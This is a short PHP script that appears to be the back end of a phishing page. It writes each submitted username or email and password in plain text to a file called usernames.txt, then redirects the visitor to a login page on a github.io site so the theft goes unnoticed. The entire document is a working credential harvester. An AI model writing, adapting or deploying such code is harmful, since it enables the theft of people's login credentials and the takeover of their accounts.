<?php

file_put_contents("usernames.txt", "Account: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://fa200fa1.github.io/mywebsite/login.html ');
exit();
